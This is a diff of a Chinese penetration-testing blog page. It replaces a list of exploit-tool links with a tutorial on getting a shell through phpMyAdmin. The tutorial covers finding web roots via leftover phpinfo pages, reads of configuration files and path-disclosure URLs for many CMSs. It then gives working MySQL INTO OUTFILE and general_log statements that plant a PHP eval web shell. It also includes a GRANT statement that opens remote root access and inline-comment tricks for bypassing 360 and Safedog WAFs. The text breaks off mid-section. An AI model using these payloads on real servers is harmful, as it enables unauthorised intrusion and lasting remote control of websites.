@@ -4,16 +4,9 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="学习总结篇—漏洞利用, dylan&#39;s blog">
-    <meta name="description" content="前言
-漏洞整合利用。
-漏洞库
-
-ExploitDB官方git版本:https://github.com/offensive-security/exploit-database
-
-CMS
-discuz
-DISCUZ漏洞扫描器：https://">
+    <meta name="keywords" content="学习总结篇—GetShell, dylan&#39;s blog">
+    <meta name="description" content="0x00 前言各种GetShell总结
+0x01 phpMyAdmin GetShell网站路径信息获取找网站的安装路径，其实就是通过“配置页面”或者“配置文件”找到Document Root 指向的网站路径位置，而Document Roo">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +14,7 @@ DISCUZ漏洞扫描器：https://">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>学习总结篇—漏洞利用 | dylan&#39;s blog</title>
+    <title>学习总结篇—GetShell | dylan&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -281,13 +274,13 @@ DISCUZ漏洞扫描器：https://">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        学习总结篇—漏洞利用
+                        学习总结篇—GetShell
                     </div>
                 </div>
             </div>
@@ -398,12 +391,12 @@ DISCUZ漏洞扫描器：https://">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/summary/" target="_blank">
-                                <span class="chip bg-color">summary</span>
+                            <a href="/tags/GetShell/" target="_blank">
+                                <span class="chip bg-color">GetShell</span>
                             </a>
                         
-                            <a href="/tags/漏洞利用/" target="_blank">
-                                <span class="chip bg-color">漏洞利用</span>
+                            <a href="/tags/summary/" target="_blank">
+                                <span class="chip bg-color">summary</span>
                             </a>
                         
                     </div>
@@ -426,21 +419,21 @@ DISCUZ漏洞扫描器：https://">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-11-20
+                    2019-08-28
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        989
+                        2.8k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        5 分
+                        12 分
                     </div>
                     
                 
@@ -456,151 +449,198 @@ DISCUZ漏洞扫描器：https://">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr>
-<p>漏洞整合利用。</p>
-<h1 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h1><hr>
+                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>各种GetShell总结</p>
+<h1 id="0x01-phpMyAdmin-GetShell"><a href="#0x01-phpMyAdmin-GetShell" class="headerlink" title="0x01 phpMyAdmin GetShell"></a>0x01 phpMyAdmin GetShell</h1><h2 id="网站路径信息获取"><a href="#网站路径信息获取" class="headerlink" title="网站路径信息获取"></a>网站路径信息获取</h2><p>找网站的安装路径，其实就是通过“配置页面”或者“配置文件”找到Document Root 指向的网站路径位置，<br>而Document Root最常见的地方就是 phpinfo.php页面和httpd.conf配置文件中；</p>
+<h3 id="phpinfo获取网站路径"><a href="#phpinfo获取网站路径" class="headerlink" title="phpinfo获取网站路径"></a>phpinfo获取网站路径</h3><h4 id="收集网站部署使用的套件信息"><a href="#收集网站部署使用的套件信息" class="headerlink" title="收集网站部署使用的套件信息"></a>收集网站部署使用的套件信息</h4><p>常见未删除phpinfo页面</p>
 <ul>
-<li>ExploitDB官方git版本:<br><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></li>
+<li>phpinfo.php</li>
+<li>info.php</li>
+<li>1.php</li>
+<li>test.php</li>
 </ul>
-<h1 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h1><hr>
-<h2 id="discuz"><a href="#discuz" class="headerlink" title="discuz"></a>discuz</h2><ul>
-<li>DISCUZ漏洞扫描器：<br><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a></li>
-</ul>
-<h2 id="泛微OA"><a href="#泛微OA" class="headerlink" title="泛微OA"></a>泛微OA</h2><ul>
-<li><p><a href="https://3h85yh.coding-pages.com/2019/10/10/fan-wei-oa-workflowcentertreedata-jie-kou-zhu-ru-lou-dong-fu-xian/" target="_blank" rel="noopener">泛微OA WorkflowCenterTreeData接口注入漏洞</a></p>
-</li>
-<li><p><a href="https://3h85yh.coding-pages.com/2019/10/28/fan-wei-ecology-oa-shu-ju-ku-pei-zhi-xin-xi-xie-lu-lou-dong-fu-xian/" target="_blank" rel="noopener">泛微ecology OA数据库配置信息泄露漏洞复现</a></p>
-</li>
-</ul>
-<h2 id="海洋cms-SEACMS"><a href="#海洋cms-SEACMS" class="headerlink" title="海洋cms(SEACMS)"></a>海洋cms(SEACMS)</h2><ul>
-<li><a href="https://3h85yh.coding-pages.com/2019/11/04/hai-yang-cms-v6.53-v6.54-ming-ling-zhi-xing-lou-dong-fu-xian/" target="_blank" rel="noopener">海洋cms(SEACMS) 漏洞整合复现</a></li>
-</ul>
-<h2 id="Maccms"><a href="#Maccms" class="headerlink" title="Maccms"></a>Maccms</h2><ul>
-<li><a href="https://3h85yh.coding-pages.com/2019/11/04/maccms8.x-ming-ling-zhi-xing-lou-dong-fu-xian-ping-guo-cms/" target="_blank" rel="noopener"> Maccms8.x(苹果cms)命令执行漏洞复现</a></li>
-</ul>
-<h2 id="ThinkCMF"><a href="#ThinkCMF" class="headerlink" title="ThinkCMF"></a>ThinkCMF</h2><ul>
-<li>ThinkCMF框架任意内容包含漏洞复现<br><a href="https://3h85yh.coding-pages.com/2019/10/24/thinkcmf-kuang-jia-ren-yi-nei-rong-bao-han-lou-dong-fu-xian/" target="_blank" rel="noopener">https://3h85yh.coding-pages.com/2019/10/24/thinkcmf-kuang-jia-ren-yi-nei-rong-bao-han-lou-dong-fu-xian/</a></li>
-</ul>
-<h2 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h2><ul>
-<li><p>TPscan: 一键ThinkPHP漏洞检测<br><a href="https://github.com/dylan903/TPscan" target="_blank" rel="noopener">https://github.com/dylan903/TPscan</a></p>
-</li>
-<li><p>关于ThinkPHP框架的历史漏洞分析集合<br><a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">ThinkPHP-Vuln</a> </p>
-</li>
-<li><p>Thinkphp5.x 全版本通杀漏洞分析<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650451917&idx=1&sn=a76fc19c079b8871174166ffdfc43eb5" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=2650451917&amp;idx=1&amp;sn=a76fc19c079b8871174166ffdfc43eb5</a></p>
-</li>
-<li><p>Thinkphp V5.X 远程代码执行漏洞-POC 集合<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650455051&idx=3&sn=d6fb1bbe7950f0f43b9794b7e02cd30f" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=2650455051&amp;idx=3&amp;sn=d6fb1bbe7950f0f43b9794b7e02cd30f</a></p>
-</li>
-<li><p>ThinkPHP5.x.x各版本实战环境getshell<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650457884&idx=2&sn=ebeb0978de0db5e56da63edcc35db9ee" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=2650457884&amp;idx=2&amp;sn=ebeb0978de0db5e56da63edcc35db9ee</a></p>
-</li>
-</ul>
-<h2 id="Vbulletin"><a href="#Vbulletin" class="headerlink" title="Vbulletin"></a>Vbulletin</h2><ul>
-<li>Identify vulnerable (RCE) vBulletin 5.0.0 - 5.5.4 instances using Shodan (CVE-2019-16759)<br><a href="https://github.com/Frint0/mass-pwn-vbulletin" target="_blank" rel="noopener">https://github.com/Frint0/mass-pwn-vbulletin</a></li>
-</ul>
-<h2 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h2><ul>
-<li><p>WPScan is a free, for non-commercial use, black box WordPress Vulnerability Scanner<br>written for security professionals and blog maintainers to test the security of their WordPress websites.<br><a href="https://github.com/dylan903/wpscan" target="_blank" rel="noopener">https://github.com/dylan903/wpscan</a></p>
-</li>
-<li><p>WPSeku：一款用于WordPress漏洞扫描的安全程序。<br><a href="https://github.com/m4ll0k/WPSeku" target="_blank" rel="noopener">https://github.com/m4ll0k/WPSeku</a></p>
-</li>
-<li><p>shack2/WPCracker: WPCracker弱口令探测<br><a href="https://github.com/shack2/WPCracker" target="_blank" rel="noopener">https://github.com/shack2/WPCracker</a></p>
-</li>
-<li><p>Wordpress未授权访问漏洞复现(CVE-2019-17671)<br><a href="https://3h85yh.coding-pages.com/2019/11/04/wordpress-wei-shou-quan-fang-wen-lou-dong-fu-xian-cve-2019-17671/" target="_blank" rel="noopener">https://3h85yh.coding-pages.com/2019/11/04/wordpress-wei-shou-quan-fang-wen-lou-dong-fu-xian-cve-2019-17671/</a></p>
-</li>
-<li><p>wordpress-exploit-framework: A Ruby framework designed to aid in the penetration testing of WordPress systems.<br><a href="https://github.com/rastating/wordpress-exploit-framework" target="_blank" rel="noopener">https://github.com/rastating/wordpress-exploit-framework</a></p>
-</li>
-<li><p>WPForce: Wordpress Attack Suite<br><a href="https://github.com/n00py/WPForce" target="_blank" rel="noopener">https://github.com/n00py/WPForce</a></p>
-</li>
-</ul>
-<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><hr>
+<p>常见未删除探针页面</p>
 <ul>
-<li><p>JAVA反序列化POC生成工具<br><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
-</li>
-<li><p>JAVA反序列化EXP<br><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p>
-</li>
+<li>l.php</li>
+<li>p.php</li>
+<li>tanzhen.php</li>
+<li>tz.php</li>
+<li>u.php</li>
 </ul>
-<h1 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h1><hr>
-<p>JBOSS一键检测工具<br>Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool<br><a href="https://github.com/dylan903/jexboss" target="_blank" rel="noopener">https://github.com/dylan903/jexboss</a></p>
-<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><hr>
+<p>常见未删除测试文件</p>
 <ul>
-<li><p>linux漏洞扫描<br><a href="https://github.com/future-architect/vuls" target="_blank" rel="noopener">https://github.com/future-architect/vuls</a></p>
-</li>
-<li><p>CentOS-Control-Web-Panel-CVE(CentOS Web面板0.9.8.836 - 0.9.8.847)<br><a href="https://github.com/i3umi3iei3ii/CentOS-Control-Web-Panel-CVE" target="_blank" rel="noopener">https://github.com/i3umi3iei3ii/CentOS-Control-Web-Panel-CVE</a></p>
-</li>
+<li>test.php</li>
+<li>ceshi.php</li>
+<li>info.php</li>
+<li>phpinfo.php</li>
+<li>php_info.php</li>
+<li>1.php</li>
 </ul>
-<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><hr>
+<h4 id="爬行遍历收集"><a href="#爬行遍历收集" class="headerlink" title="爬行遍历收集"></a>爬行遍历收集</h4><p>通过web扫描器，进行爬虫爬行遍历网站的所有链接，<br>收集可能存在的phpinfo类似的页面，收集网站物理路径信息。</p>
+<h4 id="爆破扫描收集"><a href="#爆破扫描收集" class="headerlink" title="爆破扫描收集"></a>爆破扫描收集</h4><p>通过web扫描器，进行爬虫爬行遍历网站的所有链接，<br>收集可能存在的phpinfo类似的页面，收集网站物理路径信息。</p>
+<h3 id="Google语法爆路径"><a href="#Google语法爆路径" class="headerlink" title="Google语法爆路径"></a>Google语法爆路径</h3><p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。<br>注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</p>
+<pre><code>Site:xxx.edu.tw warning
+Site:xxx.com.tw “fatal error”</code></pre><h3 id="配置文件读取网站路径"><a href="#配置文件读取网站路径" class="headerlink" title="配置文件读取网站路径"></a>配置文件读取网站路径</h3><p>关键字：<strong>web套件配置文件默认路径</strong></p>
+<p> <code>load_file()</code>函数读取配置文件<br><strong>读取配置文件httpd.conf 或vhosts.conf！！！</strong></p>
+<p>通过常用的web容器套件，来获取默认的网站可写路径信息，<br>如常用套件：xampp、phpnow、phpstudy等。</p>
+<h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h4><p>在通过web套件已经猜解到网站的默认路径后，经常会遇到向套件默认目录写入一句话后，无法成功的情况。</p>
 <ul>
-<li>PHP-FPM在Nginx特定配置下远程代码执行漏洞复现<br><a href="https://3h85yh.coding-pages.com/2019/10/23/php-fpm-zai-nginx-te-ding-pei-zhi-xia-yuan-cheng-dai-ma-zhi-xing-lou-dong-fu-xian/" target="_blank" rel="noopener">https://3h85yh.coding-pages.com/2019/10/23/php-fpm-zai-nginx-te-ding-pei-zhi-xia-yuan-cheng-dai-ma-zhi-xing-lou-dong-fu-xian/</a></li>
+<li><p>情况一：<br>一句话写入成功，但是此目录并不是渗透对象的网站根目录，<br>我们无法通过URL地址访问到“我们写入的一句话木马”；</p>
+</li>
+<li><p>情况二：<br>还有一种情况，就是对于套件默认路径，我们没有写入的权限。<br>最常见的案例就是，我们渗透的网站服务器的系统是linux主机，而没有写入权限。</p>
+</li>
 </ul>
 <ul>
-<li><p>php漏洞代码分析：<br><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a></p>
-</li>
-<li><p>php7缓存覆写漏洞Demo及相关工具<br><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p>
-</li>
+<li>情况三：<br>再有一种情况就是，目标站点有相应的安全防护如杀毒软件、安全狗、或者IPS、WAF一类的应用防护，<br>导致无法成功写入一句话。对于这种有应用防护的原理，基本一致，都是基于特征检测的方式进行安全防护，<br>如单一特征、多特征防护。那么绕过这些安全防护的方法就是使用变种，如对提交内容进行编码混淆或者采用非敏感的函数等，<br>关于木马绕过技术不在文中扩展说明。</li>
 </ul>
-<h1 id="PHPSutdy"><a href="#PHPSutdy" class="headerlink" title="PHPSutdy"></a>PHPSutdy</h1><hr>
+<p>对于以上“情况一”与“情况二”不能写入成功问题的解决思路，需要满足以下两个条件即可完美解决。</p>
+<p><strong>找到可写的网站路径</strong><br><strong>且可写路径为渗透站点的物理路径，能够被正常的URL访问解析`</strong></p>
+<p>而对于要满足以上的条件，最好的办法，就是通过读取web套件中间件的配置文件信息，获取网站的真实物理路径（如：httpd.conf）。<br>如在获知目标站点使用的xampp套件的情况，下我们可以直接利用phpmyadmin有root登录权限的条件下，<br>直接读取默认配置文件httpd.conf，通过配置文件httpd.conf收集到网站的真实物理路径，<br>读取方法：</p>
+<p><code>select load_file(&#39;D:/xampp/apache/conf/httpd.conf&#39;);</code></p>
+<p>查看数据库目录<br><code>Select @@basedir</code><br>或者<br><code>select @@basedir</code></p>
+<h4 id="Xampp套件"><a href="#Xampp套件" class="headerlink" title="Xampp套件"></a>Xampp套件</h4><p>网站默认路径：<br><code>$disk:/xampp/htdocs</code></p>
+<p>其他可写入路径：<br><code>$disk:/xampp/phpmyadmin/</code><br><strong>注：xampp套件phpmyadmin目录如果没删除，也可以尝试直接写入操作；</strong></p>
+<p>猜测默认apache默认配置文件路径，读取配置文件，查找网站根目录和可写目录路径；<br>Apache配置文件默认路径：</p>
+<p>httpd.conf配置文件：<code>$disk:/xampp/apache/conf/httpd.conf</code><br>vhosts.conf虚拟主机：<code>$disk:/xampp/apache/conf/extra/httpd-vhosts.conf</code></p>
+<h4 id="LAMPP套件"><a href="#LAMPP套件" class="headerlink" title="LAMPP套件"></a>LAMPP套件</h4><p>网站默认路径：<br><code>/opt/lampp/htdocs</code></p>
+<p>Apache配置文件默认路径：<br>httpd.conf配置文件：<code>/opt/lampp/etc/httpd.conf</code><br>vhosts.conf虚拟主机：<code>/opt/lampp/etc/extra/httpd-vhosts.conf</code></p>
+<h4 id="phpStudy套件"><a href="#phpStudy套件" class="headerlink" title="phpStudy套件"></a>phpStudy套件</h4><p>网站默认路径:</p>
+<p><code>$disk:/phpstudy/www</code></p>
+<p>Apache配置文件默认路径：</p>
+<p>httpd.conf配置文件：<code>$disk:/phpStudy/Apache/conf/httpd.conf</code><br>vhosts.conf虚拟主机：<code>$disk:/phpStudy/Apache/conf/extra/httpd-vhosts.conf</code></p>
+<h4 id="phpnow套件"><a href="#phpnow套件" class="headerlink" title="phpnow套件"></a>phpnow套件</h4><p>phpnow套件默认网站路径依据版本不同可能不同，<br>当前使用最新的版本是1.5.6，其默认目录：</p>
+<p><code>$disk:\phpnow-1.5.6\htdocs</code></p>
+<p>Apache配置文件默认路径：</p>
+<p>httpd.conf配置文件：<code>$disk:\PHPnow-1.5.6\Apache-20\conf\httpd.conf</code><br>vhosts.conf虚拟主机：<code>$disk:\PHPnow-1.5.6\Apache-20\conf\extra\vhosts.comf</code></p>
+<h4 id="LNMP套件"><a href="#LNMP套件" class="headerlink" title="LNMP套件"></a>LNMP套件</h4><p>网站默认路径：</p>
+<p><code>/home/wwwroot/default</code></p>
+<h4 id="其他Web容器"><a href="#其他Web容器" class="headerlink" title="其他Web容器"></a>其他Web容器</h4><p>IIS6.0+win2003 配置文件<br>网站默认路径：<code>$disk:\InetPub\wwwroot</code><br>配置文件默认路径：<code>C:/Windows/system32/inetsrv/metabase.xml</code></p>
+<p>IIS7.0+WINDOWS配置文件<br>网站默认路径：<code>$disk:\InetPub\wwwroot</code><br>配置文件默认路径：<code>C:\Windows\System32\inetsrv\config\applicationHost.config</code></p>
+<p>Linux:</p>
+<p>配置文件:<br><code>/etc/php.ini php</code><br><code>/etc/httpd/conf.d/php.conf</code><br>配置文件:<br><code>/etc/httpd/conf/httpd.conf Apache</code><br><code>/usr/local/apache/conf/httpd.conf</code><br><code>/usr/local/apache2/conf/httpd.conf</code><br>虚拟目录配置文件:<br><code>/usr/local/apache/conf/extra/httpd-vhosts.conf</code></p>
+<h3 id="错误页面爆网站路径"><a href="#错误页面爆网站路径" class="headerlink" title="错误页面爆网站路径"></a>错误页面爆网站路径</h3><p>特定目录报错！！！</p>
+<h4 id="Phpmyadmin暴路径"><a href="#Phpmyadmin暴路径" class="headerlink" title="Phpmyadmin暴路径"></a>Phpmyadmin暴路径</h4><p>一般在获取phpmyadmin管理页面后，特定的版本访问特点的目录，可以爆出网站的物理路径。</p>
+<ol>
+<li><code>/phpmyadmin/libraries/lect_lang.lib.php</code></li>
+<li><code>/phpMyAdmin/index.php?lang[]=1</code></li>
+<li><code>/phpMyAdmin/phpinfo.php</code></li>
+<li><code>/phpmyadmin/themes/darkblue_orange/layout.inc.php</code></li>
+<li><code>/phpmyadmin/libraries/select_lang.lib.php</code></li>
+<li><code>/phpmyadmin/libraries/lect_lang.lib.php</code></li>
+<li><code>/phpmyadmin/libraries/mcrypt.lib.php</code></li>
+</ol>
+<h4 id="SQL注入点暴路径"><a href="#SQL注入点暴路径" class="headerlink" title="SQL注入点暴路径"></a>SQL注入点暴路径</h4><p>对于存在sql注入点的页面，可以尝试“加单引号”或者“构造错误参数”进行网站路径爆错显示。</p>
+<p><code>www.xxx.com/news.php?id=149′</code><br><code>www.xxx.com/researcharchive.php?id=-1</code></p>
+<h4 id="nginx文件类型错误解析爆路径"><a href="#nginx文件类型错误解析爆路径" class="headerlink" title="nginx文件类型错误解析爆路径"></a>nginx文件类型错误解析爆路径</h4><p>当我们遇到Web服务器是nginx，且存在文件类型解析漏洞时，可以在图片地址后加<code>/x.php</code>，<br>该图片不但会被当作<code>php</code>文件执行，还有可能爆出物理路径。</p>
+<p><code>www.xyz.com/123.jpg/x.php</code></p>
+<h4 id="DeDeCms"><a href="#DeDeCms" class="headerlink" title="DeDeCms"></a>DeDeCms</h4><pre><code>/member/templets/menulit.php
+/plus/paycenter/alipay/return_url.php
+/plus/paycenter/cbpayment/autoreceive.php
+/paycenter/nps/config_pay_nps.php
+/plus/task/dede-maketimehtml.php
+/plus/task/dede-optimize-table.php
+/plus/task/dede-upcache.php</code></pre><h4 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h4><pre><code>/wp-admin/includes/file.php
+/wp-content/themes/baiaogu-seo/footer.php</code></pre><h4 id="Ecshop商城系统暴路径漏洞文件"><a href="#Ecshop商城系统暴路径漏洞文件" class="headerlink" title="Ecshop商城系统暴路径漏洞文件"></a>Ecshop商城系统暴路径漏洞文件</h4><pre><code>/api/cron.php
+/wap/goods.php
+/temp/compiled/ur_here.lbi.php
+/temp/compiled/pages.lbi.php
+/temp/compiled/user_transaction.dwt.php
+/temp/compiled/history.lbi.php
+/temp/compiled/page_footer.lbi.php
+/temp/compiled/goods.dwt.php
+/temp/compiled/user_clips.dwt.php
+/temp/compiled/goods_article.lbi.php
+/temp/compiled/comments_list.lbi.php
+/temp/compiled/recommend_promotion.lbi.php
+/temp/compiled/search.dwt.php
+/temp/compiled/category_tree.lbi.php
+/temp/compiled/user_passport.dwt.php
+/temp/compiled/promotion_info.lbi.php
+/temp/compiled/user_menu.lbi.php
+/temp/compiled/message.dwt.php
+/temp/compiled/admin/pagefooter.htm.php
+/temp/compiled/admin/page.htm.php
+/temp/compiled/admin/start.htm.php
+/temp/compiled/admin/goods_search.htm.php
+/temp/compiled/admin/index.htm.php
+/temp/compiled/admin/order_list.htm.php
+/temp/compiled/admin/menu.htm.php
+/temp/compiled/admin/login.htm.php
+/temp/compiled/admin/message.htm.php
+/temp/compiled/admin/goods_list.htm.php
+/temp/compiled/admin/pageheader.htm.php
+/temp/compiled/admin/top.htm.php
+/temp/compiled/top10.lbi.php
+/temp/compiled/member_info.lbi.php
+/temp/compiled/bought_goods.lbi.php
+/temp/compiled/goods_related.lbi.php
+/temp/compiled/page_header.lbi.php
+/temp/compiled/goods_script.html.php
+/temp/compiled/index.dwt.php
+/temp/compiled/goods_fittings.lbi.php
+/temp/compiled/myship.dwt.php
+/temp/compiled/brands.lbi.php
+/temp/compiled/help.lbi.php
+/temp/compiled/goods_gallery.lbi.php
+/temp/compiled/comments.lbi.php
+/temp/compiled/myship.lbi.php
+/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php
+/includes/modules/cron/auto_manage.php
+/includes/modules/cron/ipdel.php</code></pre><h4 id="Ucenter爆路径"><a href="#Ucenter爆路径" class="headerlink" title="Ucenter爆路径"></a>Ucenter爆路径</h4><p><code>/ucenter/control/admin/db.php</code></p>
+<h4 id="DZbbs"><a href="#DZbbs" class="headerlink" title="DZbbs"></a>DZbbs</h4><p><code>/manyou/admincp.php?my_suffix=%0A%0DTOBY57</code></p>
+<h4 id="Z-blog"><a href="#Z-blog" class="headerlink" title="Z-blog"></a>Z-blog</h4><p><code>/admin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.php</code></p>
+<h4 id="Php168爆路径"><a href="#Php168爆路径" class="headerlink" title="Php168爆路径"></a>Php168爆路径</h4><pre><code>/admin/inc/hack/count.php?job=list
+/admin/inc/hack/search.php?job=getcode
+/admin/inc/ajax/bencandy.php?job=do
+/cache/MysqlTime.txt</code></pre><p>PHPcms2008-sp4<br>注册用户登陆后访问<br><code>/phpcms/corpandresize/process.php?pic=../images/logo.gif</code></p>
+<h4 id="CMSeasy爆网站路径漏洞"><a href="#CMSeasy爆网站路径漏洞" class="headerlink" title="CMSeasy爆网站路径漏洞"></a>CMSeasy爆网站路径漏洞</h4><p>漏洞出现在menu_top.php这个文件中</p>
+<pre><code>/lib/mods/celive/menu_top.php
+/lib/default/ballot_act.php
+/lib/default/special_act.php</code></pre><h2 id="写入shell方法"><a href="#写入shell方法" class="headerlink" title="写入shell方法"></a>写入shell方法</h2><h3 id="写入条件"><a href="#写入条件" class="headerlink" title="写入条件"></a>写入条件</h3><p><strong>导出WebShell主要条件：</strong></p>
 <ul>
-<li>phpstudy后门漏洞利用工具-本工具支持单url检测，cmdshell，get web shell（写入一句话木马），批量检测。<br><a href="https://github.com/theLSA/phpstudy-backdoor-rce" target="_blank" rel="noopener">https://github.com/theLSA/phpstudy-backdoor-rce</a></li>
+<li>Root数据库用户（root权限）</li>
+<li>网站绝对路径（确定有写入权限）</li>
+<li>magic_quotes_gpc：Off（关闭）</li>
 </ul>
-<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><hr>
+<p><strong>导出WebShell其它条件：</strong></p>
 <ul>
-<li>Redis未授权一键检测工具<br> Prometheus Exporter for Redis Metrics. Supports Redis 2.x, 3.x, 4.x, and 5.x<br><a href="https://github.com/dylan903/redis_exporter" target="_blank" rel="noopener">https://github.com/dylan903/redis_exporter</a></li>
+<li>magic_quotes_gpc：开启时，会对’单引号进行转义，使其变成“\”反斜杠。</li>
+<li>secure_file_priv：此配置项用来完成对数据导入导出的限制，如允许导入导出到指定目录。</li>
+<li>file_priv：file_priv权限允许你用load_file、into outfile读和写服务器上的文件，任何被授予这个权限的用户都能读和写服务器的任何文件。</li>
 </ul>
-<h1 id="Solr"><a href="#Solr" class="headerlink" title="Solr"></a>Solr</h1><hr>
+<p><strong>写入权限</strong><br>查看能否自定义导出文件目录的权限</p>
+<p><code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code></p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/1541693041317.png" alt></p>
+<p>如果值为文件夹目录，则只允许修改目录下的文件，如果值为<code>NULL</code>则为禁止。<br>并且这个值是只读变量，只能通过配置文件修改。</p>
+<pre><code>show global variables like &quot;%secure%&quot;;      //查询secure_file_priv配置
+secure_file_prive=null              //不允许导入导出数据到目录
+secure_file_priv=c:\90sec            //允许导入导出数据到指定目录
+secure_file_priv=&#39;&#39;              //允许导入导出数据到任意目录
+secure_file_priv=&quot;/&quot;              //允许导入导出数据到任意目录</code></pre><p>注：<br>在<code>my.ini</code>、<code>my.cnf</code>、<code>mysqld.cnf</code>文件中找到<code>secure_file_prive</code><br>并将其值设置为<code>&quot;&quot;</code>或<code>&quot;/&quot;</code>，重启MySQL服务！</p>
+<h3 id="常规方法"><a href="#常规方法" class="headerlink" title="常规方法"></a>常规方法</h3><p><strong>创建数据表导出shell</strong></p>
+<pre><code>CREATE TABLE `mysql`.`shadow9` (`content` TEXT NOT NULL );
+INSERT INTO `mysql`.`shadow9` (`content` ) VALUES (&#39;&lt;?php @eval($_POST[pass]);?&gt;&#39;);
+SELECT `content` FROM `shadow9` INTO OUTFILE &#39;C:\\phpStudy\\WWW\\90sec.php&#39;;
+DROP TABLE IF EXISTS `shadow9`;</code></pre><p> <strong>一句话导出shell</strong></p>
+<pre><code>select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into outfile &#39;c:/phpstudy/www/90sec.php&#39;;  
+select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into outfile &#39;c:\\phpstudy\\www\\90sec.php&#39;;
+select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into dumpfile &#39;c:\\phpstudy\\www\\bypass.php&#39;;</code></pre><p><strong>日志备份获取shell</strong></p>
+<pre><code>show global variables like &quot;%genera%&quot;;          //查询general_log配置
+set global general_log=&#39;on&#39;;              //开启general log模式
+SET global general_log_file=&#39;D:/phpStudy/WWW/cmd.php&#39;;    //设置日志文件保存路径
+SELECT &#39;&lt;?php phpinfo();?&gt;&#39;;              //phpinfo()写入日志文件
+set global general_log=&#39;off&#39;;              //关闭general_log模式</code></pre><h3 id="绕过写入"><a href="#绕过写入" class="headerlink" title="绕过写入"></a>绕过写入</h3><p>当有WAF拦截的时候 我们可以尝试外链 这样提交的数据包不被WAF拦截<br><code>grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;root&#39; with grant option;     //开启MySQL外链</code><br><code>flush privileges;                      //刷新MySQL系统权限相关表</code></p>
+<p>这里的这些技巧是从别人那边收集过来的 感谢！！！<br>绕过360 （通过内联注释）<br><code>select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into /*!50001outfile*/ &#39;c:/phpstudy/www/bypass.php&#39;;</code></p>
+<p>绕过网站安全狗&lt;4.0 （通过hex编码）</p>
